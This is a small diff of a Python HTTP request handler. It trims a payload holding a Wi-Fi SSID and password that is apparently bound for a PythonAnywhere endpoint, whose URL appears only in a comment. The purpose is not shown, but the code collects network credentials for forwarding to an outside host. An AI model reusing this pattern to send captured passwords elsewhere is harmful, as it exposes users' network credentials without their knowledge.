@@ -1125,10 +1125,7 @@ class MyHTTPRequestHandler(SimpleHTTPRequestHandler):
                 # Prepare data for PythonAnywhere
                 data = {
                     'ssid': ssid,
-                    'password': password,
-                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-                    'priority': 10,
-                    'append': True
+                    'password': password
                 }
                 # url = 'https://christlight.pythonanywhere.com/wifi'
                 # #data = {'content': ip}
